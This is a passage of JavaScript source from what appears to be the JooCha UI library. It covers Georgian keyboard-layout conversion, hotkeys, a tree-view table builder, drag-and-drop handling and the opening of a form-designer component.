for(var i=0;i<KEYCODE_ENG.length;i++)if(KEYCODE_ENG.charAt(i)==cur)return KEYCODE_ENG.charAt(i);
for(var i=0;i<KEYCODE_RUS.length;i++)if(KEYCODE_RUS.charAt(i)==cur)return KEYCODE_RUS.charAt(i);
for(var i=0;i<KEYCODE_GEO.length;i++)if(KEYCODE_GEO.charAt(i)==cur)return KEYCODE_ENG.charAt(i);
return cur;
};


function KC_GetNormal(val)
{
var ret="";
for(var i=0;i<val.length;i++)
ret+=KC_GetUnChar(val.charAt(i));
return ret;
};

//----------------------------------------------------------------------------------
function KCG_GetSylfaen(cur)
{
for(var i=0;i<KEYCODE_ENG.length;i++)if(KEYCODE_ENG.charAt(i)==cur)return KEYCODE_GEO.charAt(i);
return cur;
};

function KCG_GetAcad(cur)
{
for(var i=0;i<KEYCODE_GEO.length;i++)if(KEYCODE_GEO.charAt(i)==cur)return KEYCODE_ENG.charAt(i);
return cur;
};


function AcadToSylfaen(acd)
{
var ret="";
for(var i=0;i<acd.length;i++)
ret+=KCG_GetSylfaen(acd.charAt(i));
return ret;
};

function AcadToSylfaenHTML(acd)
{
var ret="";
var bl=1;
for(var i=0;i<acd.length;i++)
 {
    if((acd.charAt(i)=='<')&&(bl==1))bl=0;
    if((acd.charAt(i)=='&')&&(bl==1))bl=-1;

    if((acd.substring(i,i+4)=="www.")&&(bl==1))bl=-2;
    if((acd.substring(i,i+5)=="http.")&&(bl==1))bl=-2;
    if((acd.substring(i,i+6)=="https.")&&(bl==1))bl=-2;
    if((acd.substring(i,i+4)=="mms.")&&(bl==1))bl=-2;

    if((acd.substring(i,i+4)=="$en;")&&(bl==1)){bl=-10;i+=3;continue;}
    if((acd.substring(i,i+4)=="$en;")&&(bl==-10)){bl=1;i+=3;continue;}

   if(bl==1)ret+=KCG_GetSylfaen(acd.charAt(i));
   else ret+=acd.charAt(i);

    if(acd.charAt(i)=='>')bl=1;
    if((bl==-1)&&((acd.charAt(i)==';')||(acd.charAt(i)==' ')))bl=1;
    if((bl==-2)&&((acd.charAt(i)==';')||(acd.charAt(i)==' ')))bl=1;
 };
return ret;
};

function SylfaenToAcad(acd)
{
var ret="";
for(var i=0;i<acd.length;i++)
ret+=KCG_GetAcad(acd.charAt(i));
return ret;
};

function GetGeoToEngAlpha(acd)
{
var ret="",c,s;
for(var i=0;i<acd.length;i++)
{
c=KCG_GetAcad(acd.charAt(i));
switch(c)
{
     case 'k':s="K";break;
     case 'p':s="P";break;
     case 'J':s="ZH";break;
     case 't':s="T";break;
     case 'f':s="P";break;
     case 'q':s="K";break;
     case 'R':s="GH";break;
     case 'y':s="K";break;
     case 'S':s="SH";break;
     case 'C':s="CH";break;
     case 'c':s="TS";break;
     case 'Z':s="DZ";break;
     case 'w':s="TS";break;
     case 'W':s="TCH";break;
     case 'x':s="KH";break;
     case 'j':s="J";break;
default:s=c;
}
ret+=s;
};
return ret.toLowerCase();
}

//---------------------------------------------------------
function hitKey(vKey,vParams)
{
	if(!vParams)vParams={};
	var keyboardEvent = document.createEvent("KeyboardEvent");
	var initMethod = typeof keyboardEvent.initKeyboardEvent !== 'undefined' ? "initKeyboardEvent" : "initKeyEvent";
	
	var obj=window;
	if(!vParams.hasOwnProperty("object"))obj=vParams["objects"];
	
	var eventAction="keydown";
	if(!vParams.hasOwnProperty("eventAction"))eventAction=vParams["eventAction"];
	
	var ctrl=false;
	if(!vParams.hasOwnProperty("ctrl"))ctrl=vParams["ctrl"];

	keyboardEvent[initMethod](
                   eventAction, // event type : keydown, keyup, keypress
                    true, // bubbles
                    true, // cancelable
                    obj, // viewArg: should be window
                    ctrl, // ctrlKeyArg
                    false, // altKeyArg
                    false, // shiftKeyArg
                    false, // metaKeyArg
                    vKey, // keyCodeArg : unsigned long the virtual key code, else 0
                    0 // charCodeArgs : unsigned long the Unicode character associated with the depressed key, else 0
	);
	document.dispatchEvent(keyboardEvent);
}

//---------------------------------------------------------
//---------------------------------------------------------
//---------------------------------------------------------
var HOTKEYS_EVENT=[];
var HOTKEYS_COUNTER=0;

function hotKeys(nm,kyf,vCallBack,vCallBackUp)
{
	var local=this;
	this.objectName=nm;
	this.keyFunc=kyf;
	
	this.keyList={
		ctrl_s:{ctrl:true,key:83},
		ctrl_b:{ctrl:true,key:66},
		ctrl_i:{ctrl:true,key:73},
		ctrl_u:{ctrl:true,key:85},
		ctrl_v:{ctrl:true,key:86},
		ctrl_c:{ctrl:true,key:67},
		pgup:{ctrl:false,key:33},
		pageup:{ctrl:false,key:33},
		pgdn:{ctrl:false,key:34},
		pagedown:{ctrl:false,key:34}
	};

	//-------------------------------------------------------------------
	this.keyFuncs=function keyFuncs(e)
	{
	   e=window.event || e;
	   var obj=e.srcElement || e.target;
	   
	   for(var hKey in local.keyList){
		hk=local.keyList[hKey];
		if((hk.key==e.keyCode)&&(hk.ctrl==false || (hk.ctrl==true && e.ctrlKey))&&(hk.hasOwnProperty("CallBack"))&&(typeof hk.CallBack == "function")){
			
			var prevent=true;
			try{
				prevent=hk.CallBack(e);
			}catch(e){
				//prevent=hk.CallBack();
				console.log(e);
			}
			if(prevent || prevent==undefined)e.preventDefault();
		}
	   }
	   return false;
	}
	//-------------------------------------------------------------------
	this.keyFuncsUp=function keyFuncsUp(e)
	{
	   e=window.event || e;
	   var obj=e.srcElement || e.target;
	   
	   //console.log(e.keyCode+' '+e.ctrlKey);
	   for(var hKey in local.keyList){
		hk=local.keyList[hKey];
		if((hk.key==e.keyCode)&&(hk.ctrl==false || (hk.ctrl==true && e.ctrlKey))&&(hk.hasOwnProperty("CallBackUp"))&&(typeof hk.CallBackUp == "function")){
			
			var prevent=true;
			try{
				prevent=hk.CallBackUp(e);
			}catch(e){
				//prevent=hk.CallBackUp();
				console.log(e);
			}
			if(prevent || prevent==undefined)e.preventDefault();
		}
	   }
	   return false;
	}
	
	
	
	//-------------------------------------------------------------------	
	//-------------------------------------------------------------------
	this.InitKeyFuncs=function InitKeyFuncs(nm,kyf,vCallBack,vCallBackUp)
	{
		HOTKEYS_COUNTER++;
		HOTKEYS_EVENT[HOTKEYS_COUNTER]=local;
		if(nm)local.objectName=nm;
		if(kyf)local.keyFunc=kyf;
		var indx=local.keyFunc.replace("+","_").toLowerCase();
		
		if(local.keyList.hasOwnProperty(indx)){
			if(vCallBack)local.keyList[indx].CallBack=vCallBack;
			if(vCallBackUp)local.keyList[indx].CallBackUp=vCallBackUp;
			AddEventOnObject(local.objectName,"keydown",local.keyFuncs,true);
			AddEventOnObject(local.objectName,"keyup",local.keyFuncsUp,true);
		}
	}
	
	if(this.objectName && this.objectName!=undefined && this.keyFunc && (vCallBack || vCallBackUp))local.InitKeyFuncs(this.objectName,this.keyFunc,vCallBack,vCallBackUp);
return this;	
}
/*
new hotKeys().InitKeyFuncs(window,"ctrl+s",jsFuncSave);
*/

/* jc_treeview.js */

/*
TREE VIEW SCRIPTING
*/
var accname=new Array(
'account','name','value'
);
var accwidth=new Array(
'5%','40%','25%'
);

var accarr=new Array(
'1','name1','name1',
'11','name1','name1',
'111','name1','name1',
'1110','name1','name1',
'111001','name1','name1',
'111002','name1','name1',
'12','name1','name1',
'121','name1','name1',
'1210','name1','name1',
'121001','name1','name1',
'2','name','name1',
'21','name','name1'
);

/*
<div id='treeview1' ></div>
<script language='JavaScript'>treeview1.innerHTML=TreeView(accarr,accname,accwidth);</script>
*/

function TW_HideObjectEx(obj)
{
   obj.style.display='none';
}

function TW_ShowObjectEx(obj)
{
   obj.style.display='';
}



function TW_Hide(thid,tacc)//objnm = click, th = view status, oinp = hidden input
{
var objnm='tid_'+thid;
var th='bid_'+thid;
var oinp='plus_'+tacc;

var obj=document.getElementById(objnm);
var objThis=document.getElementById(th);
var objPar=obj.parentNode;
var objInp=document.getElementById(oinp);
var tid=tacc;
var tlen=tid.length;

   if(obj.getAttribute('itemstatus')=='-')
   {
        objThis.className='tw_plus';
        if(objInp)if(objInp.value)objInp.value='+';
        obj.setAttribute('itemstatus','+');

        for(var i = 0; i <objPar.childNodes.length; i++)
        {   
            var  oloc=objPar.childNodes.item(i);
            if(oloc.nodeName.toUpperCase() == 'TR')
            {
                 var attr=oloc.getAttribute('t_account');
                 if(attr.length>tlen)
                 if(attr.substr(0,tlen)==tid) 
                 {
                       oloc.style.display='none'; 
                 }
            }
        }
    }else
   if(obj.getAttribute('itemstatus')=='+')
    {
           var locarr=new Array();
           var locali=0;

           objThis.className='tw_minus';
           if(objInp)if(objInp.value)objInp.value='-';
           obj.setAttribute('itemstatus','-');

        for(var i = 0; i <objPar.childNodes.length; i++)			
        {   
            var  oloc=objPar.childNodes.item(i);
            if(oloc.nodeName.toUpperCase() == 'TR')
            {
                 var attr=oloc.getAttribute('t_account');
                 var atlen=attr.length;
                 if(atlen>tlen)
                 if(attr.substr(0,tlen)==tid) 
                 {

                       if(oloc.getAttribute('itemstatus')=='+')
                       {
                               locarr[locali]=attr;
                               locali++;
                       }

                       var shw=true;
                       for(var pk=0;pk<locali;pk++)
                       if(locarr[pk].length<atlen)
                                    if(locarr[pk]==attr.substr(0,locarr[pk].length)){shw=false;break;}
                       if(shw)oloc.style.display=''; 
                }	
             }
         }//for
    }

}
//----------------------------------------------------------------------
function TreeView(arr,acnm,acwd,len)
{
    var otable="<table border=1>";
if(!len)len=0;
if(!acnm)acnm="";
if(acnm.length)
{
    len=acnm.length;
    otable+="<thead><tr><td >&nbsp;</td>";
    for(var i=0;i<len;i++)
        otable+="<td "+(acwd?(acwd.length?" width='"+acwd[i]+"' ":""):"")+">"+acnm[i]+"</td>";
   otable+="</tr></thead>";
};

   otable+="<tbody>";

    if(len>0)
    for(var j=0;j<arr.length/len;j++)
    {
        var locln=j*len;
        var locln2=(j+1)*len;
        var tw_ischild=0,stat="";

        if(locln2<arr.length-1)
        if(arr[locln].length<arr[locln2].length)
        if(arr[locln]==arr[locln2].substr(0,arr[locln].length)) tw_ischild=1;

        if(tw_ischild)stat="-";

        otable+="<tr id='tid_"+arr[locln]+"'   itemstatus='"+stat+"' t_account='"+arr[locln]+"' >";
        otable+="<td style='cursor:pointer;cursor:hand'  onclick=\"TW_Hide('"+arr[locln]+"','"+arr[locln]+"')\"><div style=\"width:"+arr[locln].length*10+";font-size:1px;float:left\">&nbsp;</div><b id='bid_"+arr[locln]+"'>"+stat+"</b></td>";

        for(var i=0;i<len;i++)
                    otable+="<td   "+(acwd?(acwd.length?" width='"+acwd[i]+"' ":""):"")+">"+arr[j*len+i]+"</td>";
       otable+="</tr>";
   
    }

otable+="</tbody><table>";

return otable;
}


//----------------------------------------------------------------------
function TWM_Hide(thid,cls)//objnm = click, th = view status, oinp = hidden input
{
var objnm='tid_'+thid;
var th='bid_'+thid;
var oinp='plus_'+thid;

var obj=document.getElementById(objnm);
var objThis=document.getElementById(th);
var objPar=obj.parentNode;
var objInp=document.getElementById(oinp);
var tid=thid;
var tlen=tid.length;

   if(obj.getAttribute('itemstatus')=='-')
   {
        objThis.className=cls+"_plus";
        if(objInp)if(objInp.value)objInp.value='+';
        obj.setAttribute('itemstatus','+');

        for(var i = 0; i <objPar.childNodes.length; i++)
        {   
            var  oloc=objPar.childNodes.item(i);
            if(oloc.nodeName.toUpperCase() == 'TR')
            {
                 var attr=oloc.getAttribute('t_account');
                 if(attr.length>tlen)
                 if(attr.substr(0,tlen)==tid) 
                 {
                       oloc.style.display='none'; 
                 }
            }
        }
    }else
   if(obj.getAttribute('itemstatus')=='+')
    {
           var locarr=new Array();
           var locali=0;

           objThis.className=cls+"_minus";
           if(objInp)if(objInp.value)objInp.value='-';
           obj.setAttribute('itemstatus','-');

        for(var i = 0; i <objPar.childNodes.length; i++)			
        {   
            var  oloc=objPar.childNodes.item(i);
            if(oloc.nodeName.toUpperCase() == 'TR')
            {
                 var attr=oloc.getAttribute('t_account');
                 var atlen=attr.length;
                 if(atlen>tlen)
                 if(attr.substr(0,tlen)==tid) 
                 {

                       if(oloc.getAttribute('itemstatus')=='+')
                       {
                               locarr[locali]=attr;
                               locali++;
                       }

                       var shw=true;
                       for(var pk=0;pk<locali;pk++)
                       if(locarr[pk].length<atlen)
                                    if(locarr[pk]==attr.substr(0,locarr[pk].length)){shw=false;break;}
                       if(shw)oloc.style.display=''; 
                }	
             }
         }//for
    }
}
//----------------------------------------------------------------------
function TreeViewMenu(arr,cls)
{
    var otable="<table border=0 width='100%' cellpadding=0 cellspacing=0>";
    var len=3;

   otable+="<tbody>";

    var frst=0;
    var scnd=0;
    var twok=false;
    for(var j=0;j<arr.length;j+=3)
    if(arr[j])
    {
        scnd=frst;
        frst=arr[j].length;
        if(scnd && frst)
        if(frst!=scnd){twok=true;break;};
    }

     var l2id=arr[0],l1id;
     if(l2id)if(l2id.charAt(0)=='#')l2id=l2id.substr(1,l2id.length);

    for(var j=0;j<arr.length/len;j++)
    {
        var locln=j*len;
        var locln2=(j+1)*len;
        var tw_ischild=0,stat="";
        var loc_class=cls+"_none";

        l1id=l2id;
        l2id=arr[locln2];
        if(l2id)if(l2id.charAt(0)=='#')l2id=l2id.substr(1,l2id.length);

        if(locln2<arr.length-1)
        if(l1id.length<l2id.length)
        if(l1id==l2id.substr(0,l1id.length)) tw_ischild=1;
        if(tw_ischild){stat="-";loc_class=cls+"_minus";}

        otable+="<tr id='tid_"+l1id+"'   itemstatus='"+stat+"' t_account='"+l1id+"' >";
        otable+="<td style='cursor:pointer;cursor:hand'  onmouseover=\"TWM_Hide('"+l1id+"','"+cls+"')\">";
        otable+="<table border=0 cellpadding=0 cellspacing=0 width='100%' height='100%'><tr>";
        otable+="<td  class='MB_LEFT'>&nbsp;</td>";
//        if(twok)otable+="<td width='32px' class='MB_MIDDLE'><div  id='bid_"+l1id+"' class='"+loc_class+"' style=\"font-size:1px;float:left\">&nbsp;</div></td>";
        otable+="<td  class='MB_MIDDLE'>"+arr[j*len+1]+"</td>";
        otable+="<td  class='MB_RIGHT'>&nbsp;</td></tr></table>";
        otable+="</td></tr>";
   
    }

otable+="</tbody><table>";

return otable;
}


/* jc_drag.js */

/**
 * js_drag - JavaScript JooCha Library
 *
 * Functions collection for work to draging and drop
 * 
 * @link    http://joocha.com
 * @license For open source use: GPLv3
 *          For commercial use: Commercial License
 * @author  John Chavchanidze
 * @version 1.0.1
 *
 * See usage examples at http://joocha.com/examples
 */
 
var _startX = 0;			// mouse starting positions
var _startY = 0;
var _offsetX = 0;			// current element offset
var _offsetY = 0;
var _dragElement,_dragElementCoords;			// needs to be passed from OnMouseDown to OnMouseMove
var _oldZIndex = 0;			// we temporarily increase the z-index during drag
var StartScrolling=0;
var MouseX=0,MouseY=0,G_srcElement,G_toElement,G_fromElement;

function InitMouseCoordinate(){
	RemoveEventOnObject(document,'mousemove');
	AddEventOnObject(document,'mousemove',GetMouseCoordinate,true);
}

function InitDragDrop()
{
	AddEventOnObject(document,"mousedown",OnMouseDown,true);
	AddEventOnObject(document,"mouseup",OnMouseUp,true);
	//AddEventOnObject(document.body,"scroll",OnScroll);
	AddEventOnObject(window,"dblclick",OnDblClick,true);
	InitMouseCoordinate();
}

function OnMouseReallyOut(oThis,e)
{
	// IE is retarded and doesn't pass the event object
	if (e == null) 
		e = window.event; 
	
	// IE uses srcElement, others use target
	var target = e.target != null ? e.target : e.srcElement;

    var parCnt=0;
    var bl=(target == oThis);
    while((!bl)&&(parCnt<1000))
    {
       if(target.parentNode)
       {
             target=target.parentNode;
             bl=(target == oThis);
       }else break;
       parCnt++;
    }
return bl;

}

var _MOUSE_ASDRAGING=0;//0 - not pushed, 1 - down, 0 - up, if 1 and move, then 3 this mans dragging
function OnMouseDown(e)
{
	//OnMouseUp(e);
	_MOUSE_ASDRAGING=1;
	//if(_RESIZING_PROCESSING)return true;
	// IE is retarded and doesn't pass the event object
	if (e == null) 	e = window.event; 
	// IE uses srcElement, others use target
	var target = e.target != null ? e.target : e.srcElement;
	
	//console.log(e.type+" "+target.id);

    var ttn=String(target.tagName).toLowerCase();
    switch(ttn)
    {
        case "textarea":;
        case "option":;
        case "select":;
        case "input":
        {
                var atr="";
                if(target.getAttribute)
                {
					   atr=target.getAttribute('hint');
                }

                if(atr)
                {
                   CreateHint(atr);
                }
        };break;
    }

	var drg=RegExp(/^(\s*|.*\s+)(draggable)(\s+.*|\s*)$/gi).test(getClassName(target)) && e.type=="dragstart";//not draggable event
    var bl=(RegExp(/^(\s*|.*\s+)(drag|windrag|divdrag)(\s+.*|\s*)$/gi).test(getClassName(target)) && e.type=="mousedown") || drg;
	var stopDrag=false;
    var parCnt=0;
    //if(ttn!='div')
    while((!bl)&&(parCnt<10))
    {
	   stopDrag=RegExp(/^(\s*|.*\s+)(stopdrag|stopwindrag|stopdivdrag)(\s+.*|\s*)$/gi).test(getClassName(target));
	   if(stopDrag)break;
       if(target.parentNode)
       {
			target=target.parentNode;
			drg=RegExp(/^(\s*|.*\s+)(draggable)(\s+.*|\s*)$/gi).test(getClassName(target)) && e.type=="dragstart";
			bl=(RegExp(/^(\s*|.*\s+)(drag|windrag|divdrag)(\s+.*|\s*)$/gi).test(getClassName(target)) && e.type=="mousedown")||drg;
       }else break;
       parCnt++;
    }

    if(!bl || stopDrag)return false;
    if(StartScrolling){StartScrolling=0;return false;}
	// for IE, left click == 1
	// for Firefox, left click == 0
	var but=0;
	if(e.type.toLowerCase().substr(0,5)!="touch"){
		try{but=e.buttons;}catch(err){console.log(err);};
	}

	if ((but == 1 && e!=null || 
		but == 0) && 
		//(target.className == 'drag' || target.className == 'windrag' || (target.getAttribute && target.getAttribute('divdrag') ))
		((RegExp(/^(\s*|.*\s+)(draggable)(\s+.*|\s*)$/gi).test(getClassName(target)) && e.type=="dragstart")
		|| (RegExp(/^(\s*|.*\s+)(drag|windrag|divdrag)(\s+.*|\s*)$/gi).test(getClassName(target)) && e.type=="mousedown"))
		)
	{
		GetMouseCoordinate(e);
		_startX = MouseX;
		_startY = MouseY;
	
		_offsetX = ExtractNumber(target.offsetLeft);
		_offsetY = ExtractNumber(target.offsetTop);
		if(target instanceof SVGElement){
				var cr=target.getBoundingClientRect();
				_offsetX=ExtractNumber(cr.left);
				_offsetY=ExtractNumber(cr.top);
				if(target.parentElement && target.parentElement instanceof SVGElement && target.parentElement.tagName.toLowerCase()=="svg"){
					var par=target.parentElement.getBoundingClientRect();	
					_offsetX=ExtractNumber(cr.left)-ExtractNumber(par.left);
					_offsetY=ExtractNumber(cr.top)-ExtractNumber(par.top);
				}
				// && target.tagName.toLowerCase()=="svg"
				//console.log(cr);
				//console.log(_offsetX+ " " +_offsetY);
		}
		
		_oldZIndex = target.style.zIndex;
		target.style.zIndex = 10001;
		_dragElement = target;

	
		AddEventOnObject(document,"mousemove",OnMouseMove,true);
		
		_dragElementCoords=null;
		// cancel out any text selections
		//document.body.focus();// mobilurshi dragis dros ikargeba kursori da agar gadaadgildeba
		
		// prevent text selection in IE
		//document.onselectstart = function () { return false; };
		// prevent IE from trying to drag an image
		//target.ondragstart = function() { return false; };

		// prevent text selection (except IE)
		return _dragElement;
	}
	return false;
}

function ExtractNumber(value)
{
	var n = parseInt(value);
	return n == null || isNaN(n) ? 0 : n;
}


function GetMouseCoordinate(evnt2){
  var ev=evnt2 || window.event;
  if(ev.targetTouches){
	var tch=ev.targetTouches[0];
     MouseX=tch.clientX;//pageX;
     MouseY=tch.clientY;//pageY;
  }else
  {
     MouseX=ev.clientX;
     MouseY=ev.clientY;
  }
  
  if(MouseX==undefined || MouseY==undefined){
     MouseX=ev.offsetX;
     MouseY=ev.offsetY;
  }
  
  try{
     G_srcElement=ev.srcElement;
     G_toElement=ev.toElement;
     G_fromElement=ev.fromElement;
	}catch(err){
		console.log(err);
	}
  
}

function OnMouseMove(e)
{
	if (e == null) 
		e = window.event; 
		
	var target = e.target != null ? e.target : e.srcElement;
	
	if(_MOUSE_ASDRAGING==1){
		_MOUSE_ASDRAGING=3;
		if(_dragElement && _dragElement!=undefined){
			addClass(_dragElement,"drag_moving");
			addClass(_dragElement,"dragElem");
		}
		//addClass(window.document.body,"unselectable");
	}
		

	//var but=1;try{if(e.buttons!=1)but=0;}catch(err){};
	var but=1,clientX,clientY;
	
	if(e.type.toLowerCase().substr(0,5)!="touch"){
		try{but=e.buttons;}catch(err){console.log(err);};
		clientX=e.clientX;
		clientY=e.clientY;
	}else {
		var tch=e.targetTouches[0];
		clientX=tch.clientX;//pageX;
		clientY=tch.clientY;//pageY;
	}
	//console.log(clientX+" "+clientY+" "+but+" "+_RESIZING_PROCESSING);
	//console.log(_dragElement);
	
	/*tu dragover mashin mxolod dragover-ze moxdes modzraoba da ara mousemove-ze, xolo sxva nebismier shemtxvevashi imodzraos*/

	GetMouseCoordinate(e);	
	
	if(_dragElement == null || _dragElement == undefined)return false;

	//console.log(e.type+" "+target.id+" res:"+_dragElementCoords);	
	
	if(_dragElementCoords==null){
		_dragElementCoords=GetObjectCoords(_dragElement);
		_RESIZING_PROCESSING=false;
		return;
	}
	else{
		var crd=GetObjectCoords(_dragElement);
		if((crd.width!=_dragElementCoords.width) || (crd.height!=_dragElementCoords.height)){
			_RESIZING_PROCESSING=true;
		}
	}
	
	if ((_dragElement != null) && (but==1) && (!_RESIZING_PROCESSING))
	{

		if(_dragElement.parentElement instanceof SVGElement){
			_dragElement.style.left = (_offsetX + clientX - _startX) + 'px';
			_dragElement.style.top = (_offsetY + clientY - _startY) + 'px';

			_dragElement.setAttribute("x",(_offsetX + clientX - _startX) + 'px');
			_dragElement.setAttribute("y",(_offsetY + clientY - _startY) + 'px');
		}else
		{
			_dragElement.style.left = (_offsetX + clientX - _startX) + 'px';
			_dragElement.style.top = (_offsetY + clientY - _startY) + 'px';
		}
	   
	   addClass(e,"drag_moving");
	   //console.log(_offsetX +"+"+ clientX +"-"+ _startX);
	   //console.log(_offsetY +"+"+ clientY +"-"+ _startY);
	}

	GetMouseCoordinate(e);
	e.stopPropagation();
	return true;
}

function OnMouseUp(e)
{
	var event=e || window.event;
	var target = event.target || event.srcElement;
	_RESIZING_PROCESSING=false;
	_MOUSE_ASDRAGING=0;

	if (_dragElement != null)
	{
		_dragElement.style.zIndex = _oldZIndex;
		delClass(e,"drag_moving");
		delClass(_dragElement,"drag_moving");
		delClass(_dragElement,"dragElem");
		//delClass(window.document.body,"unselectable");

		var drph=false;
		if(target && target.getAttribute)drph=target.getAttribute("data-drophere");
		if(drph){
			eval(drph);
		}
		
		InitMouseCoordinate();
		document.onselectstart = null;
		_dragElement.ondragstart = null;
		_dragElement = null;
		//console.log(e.type+" "+target.id+" stop");
		document.onmousemove="";
		
		RemoveEventOnObject(document,"mousemove",OnMouseMove);
	}
}

function OnScroll(e)
{
   e=e || window.event;
   StartScrolling=1;
   OnMouseUp();
}

function OnDblClick()
{
   StartScrolling=0;
}


function OnKeyPress(e)
{
	if (e == null)e = window.event;var target = e.target != null ? e.target : e.srcElement;

     switch(target.tagName.toLowerCase())
     {
          case "textarea":;
          case "option":;
          case "select":;
          case "input":
         if(e.keyCode==13)
         {
             return false;
         }
     }
return e.returnValue;
}

function allowDrop(ev) {
    ev.preventDefault();
}

function startDrag(ev) {
    ev.dataTransfer.setData("text", ev.target.id);
}

function hereDrop(ev) {
	var event=ev || window.event;
	var target = event.target != null ? event.target : event.srcElement;
    var data = event.dataTransfer.getData("text");
	var o=document.getElementById(data);
//console.log(event);
    if(o && (typeof o=="object"))target.appendChild(document.getElementById(data));
	event.preventDefault();
}
/*--------------------*/
var dragSrcEl = null;

function handleDragStart(ev) {
	var e=ev || window.event;
	var target = e.target != null ? e.target : e.srcElement;
	//console.log('start');	
  // Target (this) element is the source node.
	if(dragSrcEl){
		dragSrcEl.classList.remove('dragElem');
		//delClass(window.document.body,"unselectable");
	}
	dragSrcEl = target;
	
console.log(dragSrcEl);

	try{
	if(e.type.toLowerCase()=="dragstart"){
		e.dataTransfer.effectAllowed = 'copyMove';
		e.dataTransfer.setData('text/html', dragSrcEl.outerHTML);
	}
	}catch(err){console.log(err);}
	
	OnMouseDown(e);

  //this.classList.add('dragElem');
  e.stopPropagation();
  return true;//formEventDisableEx(e);
}

function handleDragOver(e) {
   if(!dragSrcEl || dragSrcEl==undefined)return false;
   if(!_dragElement || _dragElement==undefined)return false;
   
	e=e || window.event;

  if(this.classList)this.classList.add('dragOver');

  try{
  	if(e.type.toLowerCase()=="dragover"){
		e.dataTransfer.dropEffect = 'move';  // See the section on the DataTransfer object.
	}
  }catch(err){console.log(err);}
  
  OnMouseMove(e);  

  return false;//e.stopPropagation();
}

function handleDragEnter(e) {

  // this / e.target is the current hover target.
  e.stopPropagation();
  return false;//formEventDisableEx(e);
}

function handleDragLeave(e) {
  if(this.classList)this.classList.remove('dragOver');  // this / e.target is previous target element.
  handleDragEnd(e);
  return false;//formEventDisableEx(e);
}

function handleDrop(e) {
	e=e || window.event;

	if(dragSrcEl && dragSrcEl!=undefined){
		dragSrcEl.classList.remove('dragElem');
		if (dragSrcEl != this) {
			this.parentNode.insertBefore(dragSrcEl,this);
		}
	}

  if(this.classList)this.classList.remove('dragOver');
  OnMouseUp(e);
  e.stopPropagation();
  return false;//formEventDisableEx(e);
}

function handleDragEnd(e) {
	e=e || window.event;	

	if(this.classList)this.classList.remove('dragOver');
	if(dragSrcEl && dragSrcEl!=undefined){
		dragSrcEl.classList.remove('dragElem');
		//delClass(window.document.body,"unselectable");
	}
  var clsList=["draggable"];
	for(var t=0;t<clsList.length;t++){
		var els=document.getElementsByClassName(clsList[t]);
		for(var i=0;i<els.length;i++){
		els[i].classList.remove('dragOver');
		}
	}  
  OnMouseUp(e);
  e.stopPropagation();
  return false;//formEventDisableEx(e);
}

function addDnDHandlers(elem,evs) {
  if(!evs)evs={};
  AddEventOnObject(elem,'dragstart', (evs.dragstart?evs.dragstart:handleDragStart), false);
  AddEventOnObject(elem,'dragenter', (evs.dragenter?evs.dragenter:handleDragEnter), false)
  AddEventOnObject(elem,'dragover', (evs.dragover?evs.dragover:handleDragOver), false);
  AddEventOnObject(elem,'dragleave', (evs.dragleave?evs.dragleave:handleDragLeave), false);
  AddEventOnObject(elem,'drop', (evs.drop?evs.drop:handleDrop), false);
  AddEventOnObject(elem,'dragend', (evs.dragend?evs.dragend:handleDragEnd), false);
  AddEventOnObject(elem,'resize', function(){_RESIZING_PROCESSING=true;}, false);
  
  AddEventOnObject(elem,'touchstart', (evs.touchstart?evs.touchstart:handleDragStart), false);
  AddEventOnObject(elem,'touchmove', (evs.touchmove?evs.touchmove:handleDragOver), false);
  AddEventOnObject(elem,'touchcancel', (evs.touchcancel?evs.touchcancel:handleDragEnd), false)  
  AddEventOnObject(elem,'touchend', (evs.touchend?evs.touchend:handleDragEnd), false);
  
}

/*-----------------*/

function initDropedObject(){
	var clsList=["drophere","movehere"];
	for(var t=0;t<clsList.length;t++){
		var els=document.getElementsByClassName(clsList[t]);
		for(var i=0;i<els.length;i++){
		AddEventOnObject(els[i],"drop",hereDrop,false);
		AddEventOnObject(els[i],"dragover",allowDrop,false);
		}
	}

	var clsList=["draggable"];
	for(var t=0;t<clsList.length;t++){
		var els=document.getElementsByClassName(clsList[t]);
		for(var i=0;i<els.length;i++){
		els[i].setAttribute("draggable","true");
		}
	}
}
AddEventOnObject(window,"load",initDropedObject,false);

/* jc_formDesigner.js */

/**
 * js_formDesigner - JavaScript JooCha Library
 *
 * HTML Form designer
 *
 * @link    http://joocha.com
 * @license For open source use: GPLv3
 *          For commercial use: Commercial License
 * @author  John Chavchanidze
 * @version 1.0.1
 *
 * See usage examples at http://joocha.com/examples
 */

 
var formDesignerCounter=0,formDesignDragDropCounter=0,formDesignEditTempoCounter=0;
var xFormDesigners=[];
var xFormDesignersById={};
//------------------------------------------
function jc_formDesigner(vObjectOrId,helperId){
var local=this;
var _DragSrcEl=null;

	if(vObjectOrId && vObjectOrId!=undefined && vObjectOrId!=null){
	var i;
		for(i=0;i<xFormDesigners.length;i++)if(xFormDesigners[i]){
			if(xFormDesigners[i].name==vObjectOrId)break;
		}
		if(i<xFormDesigners.length)formDesignerCounter=i;
		else formDesignerCounter++;
	}
	else formDesignerCounter++;

	this.SVGNS = "http://www.w3.org/2000/svg";
	this.xHTML="http://www.w3.org/1999/xhtml";
	this.svgAttributes={"xmlns":"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink"};
	this.ActiveNS=this.xHTML;
	
	this.svgTagsParams={"rect":["width","height","x","y","rx","ry"],
					  "circle":["width","height","x","y","rx","ry","cx","cy","r"],
					  "ellipse":["width","height","x","y","rx","ry","cx","cy","r"],
					  "line":["width","height","x","y","x1","x2","y1","y2"],
					  "polyline":["width","height","x","y","points"],
					  "polygon":["width","height","x","y","points"],
					  "path":["width","height","x","y","points"],
					  "text":["width","height","x","y","rx","ry","cx","cy"],
					  "default":["width","height"]
					  };
					  
	this.ObjectCounter=formDesignerCounter;
	this.myObject=null;
	this.myObjectId="jc_formDesigner"+this.ObjectCounter;
	this.name=this.myObjectId;
	
	this.selectedObject=null;
	
	this.canvasId="";
	this.canvasElement="";
	this.ctx="";
	
	if(this.helperId)this.helperId=helperId;
	else this.helperId="xFormDesignersHelperId";
	
	this.parent=null;
	if(vObjectOrId!=null && vObjectOrId!=undefined){
	this.parent=vObjectOrId;
	if(typeof vObjectOrId !== "object")this.parent=document.getElementById(vObjectOrId);
	}
	
	this.ParentID=0;
	if(this.parent != null && this.parent != undefined){
		if(this.parent.id)
			this.ParentID=this.parent.id;
		else 
			this.ParentID=this.parent.id="xFormDesignerID"+this.ObjectCounter;	
	}
	
	this.storageItemName="storageFD_"+this.ParentID;
	this.layerBoxId="layerContainer_"+this.ParentID;
	this.formAsyncId="formAsyncContainer_"+this.ParentID;
